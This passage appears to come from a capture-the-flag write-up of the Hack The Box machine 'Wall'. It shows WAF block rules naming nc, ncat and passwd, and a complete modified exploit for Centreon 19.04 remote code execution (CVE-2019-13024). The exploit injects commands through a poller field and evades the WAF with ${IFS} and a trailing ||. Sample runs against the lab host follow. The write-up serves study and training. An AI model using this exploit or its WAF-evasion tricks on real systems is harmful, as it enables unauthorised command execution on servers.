+</span><span class="go">SecRule REQUEST_BODY "\bncat\b" "id:00002,deny,msg:'blocked'"
+
+</span><span class="c"># block passwd word
+</span><span class="go">SecRule REQUEST_BODY "\bpasswd\b" "id:00003,deny,msg:'blocked'"
+
+</span><span class="c"># block # char
+</span><span class="go">SecRule REQUEST_BODY "%23" "id:00004,deny,msg:'blocked'"
+
+</span><span class="c"># block any whitespace
+</span><span class="go">SecRule REQUEST_BODY "\+" "id:00005,deny,msg:'blocked'"
+
+</span><span class="c"># block hostname word
+</span><span class="go">SecRule REQUEST_BODY "\bhostname\b" "id:00006,deny,msg:'blocked'"
+</span></code></pre></div></div>
+<p>It’s blocking <code class="language-plaintext highlighter-rouge">nc</code>, <code class="language-plaintext highlighter-rouge">ncat</code>, <code class="language-plaintext highlighter-rouge">passwd</code>, <code class="language-plaintext highlighter-rouge">#</code>, <code class="language-plaintext highlighter-rouge">+</code>, and <code class="language-plaintext highlighter-rouge">hostname</code>. I’ll notice all of these rules are looking at the REQUEST_BODY.</p>
+<h3 id="script-upgrades">Script Upgrades</h3>
+<p>Working the box, I needed to make the script able to take commands that I gave it at the command line so that I could bypass the WAF and get a shell. But I did take it a bit further:</p>
+<ol>
+<li>Integrate substitution for space so that I don’t have to type <code class="language-plaintext highlighter-rouge">${IFS}</code>.</li>
+<li>Get output of commands.</li>
+<li>Add error handling for WAF failures.</li>
+</ol>
+<p>First, I added a simple upgrade to the payload to get around the WAF, at least for the space, by changing the payload to:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">${IFS}</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Next, I noticed in the blog post that he was able to read the output of his commands. I also noticed that the injection is into a PHP <code class="language-plaintext highlighter-rouge">shell_exec</code>, where my input string is at the front of the input. In the blog post, he ends his payload with a <code class="language-plaintext highlighter-rouge">#</code>, which is a comment. But it’s also a character that triggers the WAF. Another thing I could add to the end of my string is <code class="language-plaintext highlighter-rouge">||</code>, or logical or. This means that assuming my command succeeds, it won’t run what comes next. I added that into the payload:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">"</span><span class="s">nagios_bin</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s">||</span><span class="sh">'</span>
+</code></pre></div></div>
+<p>Now I can see the output when I send the second POST. I’ll add some regex to extract the results, as well as some error handling.</p>
+<p>The resulting code is:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="sh">'''</span><span class="s">
+# Exploit Title: Centreon v19.04 authenticated Remote Code Execution
+# Date: 28/06/2019
+# Exploit Author: Askar (@mohammadaskar2):
+# Modified By: 0xdf
+# CVE : CVE-2019-13024
+# Vendor Homepage: https://www.centreon.com/
+# Version: v19.04
+# Tested on: CentOS 7.6 / PHP 5.4.16
+</span><span class="sh">'''</span>
+
+<span class="kn">import</span> <span class="n">re</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">warnings</span>
+<span class="kn">from</span> <span class="n">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="c1"># turn off BeautifulSoup warnings
+</span><span class="n">warnings</span><span class="p">.</span><span class="nf">filterwarnings</span><span class="p">(</span><span class="sh">"</span><span class="s">ignore</span><span class="sh">"</span><span class="p">,</span> <span class="n">category</span><span class="o">=</span><span class="nb">UserWarning</span><span class="p">,</span> <span class="n">module</span><span class="o">=</span><span class="sh">'</span><span class="s">bs4</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">))</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[~] Usage : ./centreon-exploit.py url username password command</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">exit</span><span class="p">()</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">username</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">password</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+<span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">${IFS}</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">burp</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">http://localhost:8080</span><span class="sh">'</span><span class="p">}</span>
+
+<span class="n">request</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">session</span><span class="p">()</span>
+<span class="n">request</span><span class="p">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">burp</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Retrieving CSRF token to submit the login form</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">page</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="sh">"</span><span class="s">/index.php</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">html_content</span> <span class="o">=</span> <span class="n">page</span><span class="p">.</span><span class="n">text</span>
+<span class="n">soup</span> <span class="o">=</span> <span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">html_content</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="sh">"</span><span class="s">lxml</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">token</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">findAll</span><span class="p">(</span><span class="sh">'</span><span class="s">input</span><span class="sh">'</span><span class="p">)[</span><span class="mi">3</span><span class="p">].</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">value</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">login_info</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">useralias</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">submitLogin</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Connect</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">centreon_token</span><span class="sh">"</span><span class="p">:</span> <span class="n">token</span>
+<span class="p">}</span>
+<span class="n">login_request</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="sh">"</span><span class="s">/index.php</span><span class="sh">"</span><span class="p">,</span> <span class="n">login_info</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Login token is : {0}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">token</span><span class="p">))</span>
+<span class="k">if</span> <span class="sh">"</span><span class="s">Your credentials are incorrect.</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">login_request</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Logged In Sucssfully</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Retrieving Poller token</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="n">poller_configuration_page</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/main.get.php?p=60901</span><span class="sh">"</span>
+    <span class="n">get_poller_token</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">poller_configuration_page</span><span class="p">)</span>
+    <span class="n">poller_html</span> <span class="o">=</span> <span class="n">get_poller_token</span><span class="p">.</span><span class="n">text</span>
+    <span class="n">poller_soup</span> <span class="o">=</span> <span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">poller_html</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="sh">"</span><span class="s">lxml</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">poller_token</span> <span class="o">=</span> <span class="n">poller_soup</span><span class="p">.</span><span class="nf">findAll</span><span class="p">(</span><span class="sh">'</span><span class="s">input</span><span class="sh">'</span><span class="p">)[</span><span class="mi">24</span><span class="p">].</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">value</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Poller token is : {0}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">poller_token</span><span class="p">))</span>
+
+    <span class="n">payload_info</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sh">"</span><span class="s">name</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Central</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">ns_ip_address</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span>
+        <span class="c1"># this value should be 1 always
+</span>        <span class="sh">"</span><span class="s">localhost[localhost]</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">is_default[is_default]</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">remote_id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">ssh_port</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">22</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">init_script</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">centengine</span><span class="sh">"</span><span class="p">,</span>
+        <span class="c1"># this value contains the payload , you can change it as you want
+</span>        <span class="sh">"</span><span class="s">nagios_bin</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s">||</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">nagiostats_bin</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">/usr/sbin/centenginestats</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">nagios_perfdata</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">/var/log/centreon-engine/service-perfdata</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">centreonbroker_cfg_path</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">/etc/centreon-broker</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">centreonbroker_module_path</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">/usr/share/centreon/lib/centreon-broker</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">centreonbroker_logs_path</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">centreonconnector_path</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">/usr/lib64/centreon-connector</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">init_script_centreontrapd</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">centreontrapd</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">snmp_trapd_path_conf</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">/etc/snmp/centreon_traps/</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">ns_activate[ns_activate]</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">submitC</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Save</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">o</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">c</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">centreon_token</span><span class="sh">"</span><span class="p">:</span> <span class="n">poller_token</span><span class="p">,</span>
+    <span class="p">}</span>
+
+    <span class="n">send_payload</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">poller_configuration_page</span><span class="p">,</span> <span class="n">payload_info</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Payload inject status code: </span><span class="si">{</span><span class="n">send_payload</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">send_payload</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">403</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] WAF blocked command. Try something else</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Injecting Done, triggering the payload</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">generate_xml_page</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/include/configuration/configGenerate/xml/generateFiles.php</span><span class="sh">"</span>
+    <span class="n">xml_page_data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sh">"</span><span class="s">poller</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">debug</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">generate</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">generate_xml_page</span><span class="p">,</span> <span class="n">xml_page_data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sh">"</span><span class="s">id=</span><span class="sh">'</span><span class="s">debug_1</span><span class="sh">'</span><span class="s">&gt;(.*)&lt;br&gt;&lt;br&gt;&lt;/div&gt;&lt;br/&gt;]]</span><span class="sh">"</span><span class="p">,</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;br&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">))</span>
+    <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">Timeout</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="k">else</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] Wrong credentials</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">exit</span><span class="p">()</span>
+</code></pre></div></div>
+<p>When it runs, it looks like, with both a failure (<code class="language-plaintext highlighter-rouge">hostname</code> is blacklisted) and a success:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./centreon-0xdf.py http://10.10.10.157/centreon/ admin password1 <span class="s2">"hostname"</span>
+<span class="go">[+] Retrieving CSRF token to submit the login form
+[+] Login token is : 829c505845f89f2057d44136440c8665
+[+] Logged In Sucssfully
+[+] Retrieving Poller token
+[+] Poller token is : ca4c0c82566cef21642020c602a2feac
+[*] Payload inject status code: 403
+[-] WAF blocked command. Try something else
+
+</span><span class="gp">root@kali# </span>./centreon-0xdf.py http://10.10.10.157/centreon/ admin password1 <span class="s2">"uname -a"</span>
+<span class="go">[+] Retrieving CSRF token to submit the login form
+[+] Login token is : f1751b09c89e8cded9ed6d469bec20d6
+[+] Logged In Sucssfully
+[+] Retrieving Poller token
+[+] Poller token is : e056d43e94946b0dfeec827b36ff26fd
+[*] Payload inject status code: 200
+[+] Injecting Done, triggering the payload
+Linux Wall 4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+</span></code></pre></div></div>
+<h3 id="trolls">Trolls</h3>
+<p>One of my least favorite thing about this box was a series of weird troll files sprinkled all over it. It’s not clear to me why authors add these kinds of things without any pretense that they belong on the boc. That said, I always check them out once I have a shell.</p>
+<p>On the main webroot, <code class="language-plaintext highlighter-rouge">aa.php</code> and <code class="language-plaintext highlighter-rouge">panel.php</code> were files I spent some time fuzzing.</p>
+<p><code class="language-plaintext highlighter-rouge">aa.php</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">echo</span> <span class="mi">1</span><span class="p">;</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">panel.php</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+
+<span class="k">echo</span> <span class="s2">"Just a test for php file !"</span><span class="p">;</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>There was another added at the <code class="language-plaintext highlighter-rouge">/centreon/</code> root, <code class="language-plaintext highlighter-rouge">a.php</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="mi">1</span><span class="p">;</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Nothing here interesting.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2019/12/07/htb-wall.html"></a>
+</article>
